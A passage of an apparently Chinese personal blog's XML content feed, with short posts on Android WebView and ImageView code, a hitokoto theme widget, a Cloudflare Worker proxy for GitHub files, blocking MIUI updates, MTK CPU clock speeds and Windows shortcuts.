实现按下源生返回键，返回到上一个网页的方法，直接复制即可，</span></span><br><span class="line"><span class="comment"> * 此方法为监听返回按键时的处理</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onKeyDown</span><span class="params">(<span class="keyword">int</span> keyCode, KeyEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//监听到返回键被按下，并且当前网页可被返回</span></span><br><span class="line">    <span class="keyword">if</span> (KeyEvent.KEYCODE_BACK == keyCode &amp;&amp; webView.canGoBack()) &#123;</span><br><span class="line">        <span class="comment">//获取当前的网址，与初始网址界面是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (webView.getUrl().equals(LINK)) &#123;</span><br><span class="line">            <span class="comment">//相同表示为第一次进入的网址，上一级为源生</span></span><br><span class="line">            finish();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//返回到网页的上一级</span></span><br><span class="line">            webView.goBack();</span><br><span class="line">            <span class="comment">//返回true，交于系统处理</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.onKeyDown(keyCode, event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>记得申请网络权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>来源 进度条 <a href="https://blog.csdn.net/qq_23491413/article/details/80017201" target="_blank" rel="noopener">jnn_dream</a><br>返回到上个网页  <a href="https://blog.csdn.net/qq_34517710/article/details/70239934" target="_blank" rel="noopener">Flipped_九蛋</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>yilia添加一言</title>
      <link href="/2021/yilia-tian-jia-yi-yan/"/>
      <url>/2021/yilia-tian-jia-yi-yan/</url>
      
        <content type="html"><![CDATA[<p>博客侧栏/顶部有一个展示博客标题的位置，感觉什么好的文字可以留上，干脆替换成一言  </p><a id="more"></a>  <h4 id="PC界面侧边栏的一言"><a href="#PC界面侧边栏的一言" class="headerlink" title="PC界面侧边栏的一言"></a>PC界面侧边栏的一言</h4><p>打开主题目录里的 <code>layout/_partial/left-col.ejs</code> 文件，找到 <code>&lt;p class=&quot;header-subtitle&quot;&gt;&lt;%=theme.subtitle%&gt;&lt;/p&gt;</code> ，将其替换为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"hitokoto"</span> <span class="attr">href</span>=<span class="string">"#"</span>  <span class="attr">onmouseover</span>=<span class="string">"this.style.color='#7fffd4';"</span> <span class="attr">onmouseout</span>=<span class="string">"this.style.color='aliceblue';"</span>&gt;</span>_(:з」∠)_ 加载中...<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bluebird@3/js/browser/bluebird.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/whatwg-fetch@2.0.3/fetch.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto"</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="移动端界面顶部展示一言"><a href="#移动端界面顶部展示一言" class="headerlink" title="移动端界面顶部展示一言"></a>移动端界面顶部展示一言</h4><p>打开主题目录 <code>layout/_partial/mobile-nav.ejs</code> 文件，找到 <code>&lt;p class=&quot;header-subtitle&quot;&gt;&lt;i class=&quot;icon icon-quo-left&quot;&gt;&lt;/i&gt;&lt;%=theme.subtitle%&gt;&lt;i class=&quot;icon icon-quo-right&quot;&gt;&lt;/i&gt;&lt;/p&gt;</code> ，替换为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"header-subtitle"</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"icon icon-quo-left"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"hitokoto2"</span> <span class="attr">href</span>=<span class="string">"#"</span>  <span class="attr">onmouseover</span>=<span class="string">"this.style.color='#7fffd4';"</span> <span class="attr">onmouseout</span>=<span class="string">"this.style.color='aliceblue';"</span> <span class="attr">style</span>=<span class="string">"color:#696969"</span>&gt;</span>_(:з」∠)_ 加载中...<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bluebird@3/js/browser/bluebird.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/whatwg-fetch@2.0.3/fetch.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto2"</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>来源<a href="https://blog.csdn.net/m0_51078229/article/details/110943313" target="_blank" rel="noopener">hexo主题yilia个性化（一言，左侧栏自定义，图片自定义…） - huamanggg</a> （有修改）</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>方形ImageView</title>
      <link href="/2021/fang-xing-imageview/"/>
      <url>/2021/fang-xing-imageview/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.support.annotation.Nullable;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.widget.AppCompatImageView;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by libo on 2017/11/7.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqureImageView</span> <span class="keyword">extends</span> <span class="title">AppCompatImageView</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SqureImageView</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SqureImageView</span><span class="params">(Context context, @Nullable AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context, attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMeasure</span><span class="params">(<span class="keyword">int</span> widthMeasureSpec, <span class="keyword">int</span> heightMeasureSpec)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//让宽度的测量尺寸代替高度尺寸</span></span><br><span class="line">        <span class="keyword">super</span>.onMeasure(widthMeasureSpec,widthMeasureSpec);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>  <p>使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SqureImageView</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:layout_width</span>=<span class="string">"200dp"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:background</span>=<span class="string">"@mipmap/test4"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:layout_marginTop</span>=<span class="string">"20dp"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">android:scaleType</span>=<span class="string">"centerCrop"</span>/&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>来源：<a href="https://www.jianshu.com/p/52518b8aff17" target="_blank" rel="noopener">自定义view系列之——Imageview–圆形，圆角，正方形，自适应高度，设置比例 - 奔跑吧李博</a> | <a href="https://github.com/running-libo/FunctionImageViews" target="_blank" rel="noopener">Github</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动停机充值绿色通道</title>
      <link href="/2021/yi-dong-ting-ji-chong-zhi-lu-se-tong-dao/"/>
      <url>/2021/yi-dong-ting-ji-chong-zhi-lu-se-tong-dao/</url>
      
        <content type="html"><![CDATA[<p>停机状态下还显示4G网络可用停机充值绿色通道缴费</p><p><a href="http://touch.10086.cn/i/mobile/greentip.html" target="_blank" rel="noopener">http://touch.10086.cn/i/mobile/greentip.html</a></p><a id="more"></a><p><a href="https://gddhy.net/qr/#http://touch.10086.cn/i/mobile/greentip.html" target="_blank" rel="noopener">查看二维码</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tts百度api</title>
      <link href="/2021/tts-bai-du-api/"/>
      <url>/2021/tts-bai-du-api/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tts.baidu.com/text2audio?tex=hi~%20%E5%B0%8F%E6%AD%A6%20%20%E4%BD%A0%E5%98%8E%E5%93%88&cuid=baike&lan=ZH&ctp=1&pdt=301&vol=9&rate=32&per=0" target="_blank" rel="noopener">https://tts.baidu.com/text2audio?tex=hi~%20%E5%B0%8F%E6%AD%A6%20%20%E4%BD%A0%E5%98%8E%E5%93%88&amp;cuid=baike&amp;lan=ZH&amp;ctp=1&amp;pdt=301&amp;vol=9&amp;rate=32&amp;per=0</a></p><a id="more"></a>  <p>来源<a href="https://blog.csdn.net/jackbon8/article/details/99714422" target="_blank" rel="noopener">https://blog.csdn.net/jackbon8/article/details/99714422</a></p><p>补充：<a href="https://blog.csdn.net/muzihuaner/article/details/124958623" target="_blank" rel="noopener">https://blog.csdn.net/muzihuaner/article/details/124958623</a><br>这个里面详细说明了api的相关参数</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android播放网络音频</title>
      <link href="/2021/android-bo-fang-wang-luo-yin-pin/"/>
      <url>/2021/android-bo-fang-wang-luo-yin-pin/</url>
      
        <content type="html"><![CDATA[<p>1.确保app申请了网络权限</p><p>2.如果音频是http开头设置打开http链接 </p><p>3.添加代码 网络资源尽量要设置异步 不如资源不存在的话会阻塞</p><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">playOnlineSound</span><span class="params">(String soundUrlDict)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            MediaPlayer mediaPlayer = <span class="keyword">new</span> MediaPlayer();</span><br><span class="line">            mediaPlayer.setDataSource(soundUrlDict);</span><br><span class="line">            mediaPlayer.prepareAsync();</span><br><span class="line">            mediaPlayer.setOnPreparedListener(<span class="keyword">new</span> MediaPlayer.OnPreparedListener() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onPrepared</span><span class="params">(MediaPlayer mediaPlayer)</span> </span>&#123;</span><br><span class="line">                    mediaPlayer.start();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            mediaPlayer.setOnCompletionListener(<span class="keyword">new</span> MediaPlayer.OnCompletionListener() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCompletion</span><span class="params">(MediaPlayer mp)</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (mp != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        mp.release();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            mediaPlayer.setOnErrorListener(<span class="keyword">new</span> MediaPlayer.OnErrorListener() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onError</span><span class="params">(MediaPlayer mediaPlayer, <span class="keyword">int</span> i, <span class="keyword">int</span> i1)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>转载自<a href="https://www.cnblogs.com/zhangxuetao/articles/14275015.html" target="_blank" rel="noopener">android 播放网络音频 - 张学涛</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>用Cloudflare Worker加速Github文件访问</title>
      <link href="/2021/yong-cloudflare-worker-jia-su-github-wen-jian-fang-wen/"/>
      <url>/2021/yong-cloudflare-worker-jia-su-github-wen-jian-fang-wen/</url>
      
        <content type="html"><![CDATA[<p>之前一直用jsDelivr来加速Github项目中的一些文件访问，最近发现用jsDelivr无法访问项目里的apk文件了，遂将目光转向Worker  </p><a id="more"></a>  <p>在Cloudflare 里创建 Worker添加下面代码，测试ok后解析到域名就能用</p><p>目前满足使用需求，避免滥用写死了我自己的仓库</p><p>访问文件时，可选参数c是仓库，m是分支<br><a href="https://res.gddhy.net/app/release/app-release.apk?c=coolapk-emotion" target="_blank" rel="noopener">https://res.gddhy.net/app/release/app-release.apk?c=coolapk-emotion</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> url = <span class="string">"https://raw.githubusercontent.com/gddhy/"</span></span><br><span class="line"></span><br><span class="line">addEventListener(<span class="string">"fetch"</span>, event =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> str = event.request.url</span><br><span class="line">  <span class="keyword">var</span> link = <span class="string">""</span></span><br><span class="line">  <span class="keyword">var</span> master = <span class="string">"master"</span></span><br><span class="line">  <span class="keyword">var</span> cangku = <span class="string">"blog-res"</span></span><br><span class="line">  <span class="keyword">const</span> inText = <span class="string">".gddhy.net/"</span></span><br><span class="line">  <span class="keyword">if</span>(str.indexOf(inText)&gt;=<span class="number">0</span> )&#123;</span><br><span class="line">    link = str.substring(str.indexOf(inText)+inText.length)</span><br><span class="line">    <span class="keyword">if</span>(link.indexOf(<span class="string">"?"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">      link = link.substring(<span class="number">0</span>,link.indexOf(<span class="string">"?"</span>))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(str.indexOf(<span class="string">"?"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> data = str.substring(str.indexOf(<span class="string">"?"</span>)+<span class="number">1</span>)</span><br><span class="line">    cangku = getQueryVariable(data,<span class="string">"c"</span>,cangku)</span><br><span class="line">    master = getQueryVariable(data,<span class="string">"m"</span>,master)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  link = url + cangku + <span class="string">"/"</span> + master + <span class="string">"/"</span> + link</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> event.respondWith(handleRequest(link))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">gatherResponse</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; headers &#125; = response</span><br><span class="line">  <span class="keyword">const</span> contentType = headers.get(<span class="string">"content-type"</span>) || <span class="string">""</span></span><br><span class="line">  <span class="keyword">if</span> (contentType.includes(<span class="string">"application/json"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(<span class="keyword">await</span> response.json())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (contentType.includes(<span class="string">"application/text"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> response.text()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (contentType.includes(<span class="string">"text/html"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> response.text()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> response.blob()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">handleRequest</span>(<span class="params">link</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> lastChar = link.substring(link.length - <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">if</span>(lastChar.indexOf(<span class="string">"/"</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Response(<span class="string">"ERROR"</span>, &#123; <span class="attr">status</span>: <span class="number">200</span> &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> init = &#123;</span><br><span class="line">    headers: &#123;</span><br><span class="line">      <span class="string">"content-type"</span>: <span class="string">"application/octet-stream"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> fetch(link, init)</span><br><span class="line">  <span class="keyword">const</span> results = <span class="keyword">await</span> gatherResponse(response)</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Response(results, init)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryVariable</span>(<span class="params">data,variable,defaultData</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> vars = data.split(<span class="string">"&amp;"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.length;i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> pair = vars[i].split(<span class="string">"="</span>)</span><br><span class="line">      <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;</span><br><span class="line">        <span class="keyword">return</span> pair[<span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> defaultData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>屏蔽MIUI系统更新</title>
      <link href="/2021/ping-bi-miui-xi-tong-geng-xin/"/>
      <url>/2021/ping-bi-miui-xi-tong-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>通过修改 <code>/system/build.prop</code> 实现屏蔽系统更新  </p><a id="more"></a>  <p>找到 <code>ro.build.version.incremental</code> 与 <code>ro.system.build.version.incremental</code> 改到比当前版本高就行</p><p>例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ro.build.version.incremental=V13<span class="number">.0</span><span class="number">.0</span><span class="number">.0</span>.QFKCNXM</span><br><span class="line">ro.system.build.version.incremental=V13<span class="number">.0</span><span class="number">.0</span><span class="number">.0</span>.QFKCNXM</span><br></pre></td></tr></table></figure><p>可以用<a href="https://www.coolapk.com/apk/com.omarea.vtools" target="_blank" rel="noopener">Scene 4</a> 里的magisk助手功能修改属性，实现修改build.prop</p><h4 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h4><p>通过修改本机或路由器host，将MIUI更新域名屏蔽</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0.0.1</span> update.miui.com</span><br></pre></td></tr></table></figure><p>（屏蔽域名仅提供这个方法，未测试，修改build.prop测试ok）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>人间至味</title>
      <link href="/2021/ren-jian-zhi-wei/"/>
      <url>/2021/ren-jian-zhi-wei/</url>
      
        <content type="html"><![CDATA[<p>风雨犹祝，山海同欢，是承天地之佑</p><p>星移斗转，沧海桑田，烟火人间依旧</p><p>功名在我，百岁千秋，毋忘秉烛夜游</p><p>今古诸事，激荡中流，宏图待看新秀</p><a id="more"></a>  <p><strong>《原神》剧情PV-「人间至味」</strong></p><iframe src="//player.bilibili.com/player.html?aid=335756622&bvid=BV1yR4y1p7WX&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      
        <tags>
            
            <tag> 原神 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MTK功能机CPU主频性能对比</title>
      <link href="/2021/mtk-xing-neng/"/>
      <url>/2021/mtk-xing-neng/</url>
      
        <content type="html"><![CDATA[<p>MT6223-52MHz &lt; MT6225-104MHz = MT6253-104MHz &lt; MT6235-208MHz &lt; MT6252 未知&lt; MT6268-246MHz &lt; MT6250-260MHz = MT6261-260MHz&lt; MT6236-312MHz &lt; MT6260-360MHz &lt; MT6255-416MHz &lt; MT6276-650MHz  </p><a id="more"></a>  <table><thead><tr><th align="center">CPU型号</th><th align="center">主频</th></tr></thead><tbody><tr><td align="center">MT6276</td><td align="center">650MHz</td></tr><tr><td align="center">MT6255</td><td align="center">416MHz</td></tr><tr><td align="center">MT6260</td><td align="center">360MHz</td></tr><tr><td align="center">MT6236</td><td align="center">312MHz</td></tr><tr><td align="center">MT6250/MT6261</td><td align="center">260MHz</td></tr><tr><td align="center">MT6268</td><td align="center">246MHz</td></tr><tr><td align="center">MT6252</td><td align="center"></td></tr><tr><td align="center">MT6235</td><td align="center">208MHz</td></tr><tr><td align="center">MT6225/MT6253</td><td align="center">104MHz</td></tr><tr><td align="center">MT6223</td><td align="center">52MHz</td></tr></tbody></table><p>表格查看起来更直观些，表格中越往上性能越强</p><p><img src="/img/preloader.gif" data-original="mtk.jpg" alt="mtk">  </p><p>参数对比信息来自大白</p>]]></content>
      
      
      
        <tags>
            
            <tag> mtk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>山东移动套餐公示</title>
      <link href="/2021/shan-dong-yi-dong-tao-can-gong-shi/"/>
      <url>/2021/shan-dong-yi-dong-tao-can-gong-shi/</url>
      
        <content type="html"><![CDATA[<p>全量在售套餐及山东移动资费公示</p><p><a href="https://shop.10086.cn/hd/skin/custom/823128/index.html" target="_blank" rel="noopener">https://shop.10086.cn/hd/skin/custom/823128/index.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Win组合快捷键</title>
      <link href="/2021/win-zu-he-kuai-jie-jian/"/>
      <url>/2021/win-zu-he-kuai-jie-jian/</url>
      
        <content type="html"><![CDATA[<p>使用Win键组合的快捷键  </p><a id="more"></a>  <h4 id="Win10"><a href="#Win10" class="headerlink" title="Win10"></a>Win10</h4><p>Win + i 设置<br>Win + u 显示设置<br>Win + r 运行<br>Win + e 资源管理器<br>Win + l 锁屏<br>Win + p 投影<br>Win + q / Win +s搜索<br>Win + v 粘贴板历史<br>Win + a 通知/快捷磁贴<br>Win + d 桌面<br>Win + f Win反馈<br>Win + tab 多任务<br>Win + k 连接无线显示器/音频<br>Win + x 菜单<br>Win + 空格 切换输入法  </p><h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><p>Win + / 显示系统支持的快捷键  </p><p>下边是在MIUI上支持的快捷键，其他手机可以用Win + / 查看支持的快捷键</p><p>Win + l 日历<br>Win + b 浏览器<br>Win + e 电子邮件<br>Win + s 短信<br>Win + c 通讯录<br>Win + p 音乐<br>Win + enter 桌面<br>Win + n 通知<br>Win + backspace 返回  </p><p>安卓可以使用 alt + tab 进入多任务</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>android ImageView 手势缩放，双击放大，自由滑动，多点触控，惯性滑动</title>
      <link href="/2021/android-imageview/"/>
      <url>/2021/android-imageview/</url>
      
        <content type="html"><![CDATA[<p>兼容viewPager  </p><a id="more"></a>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 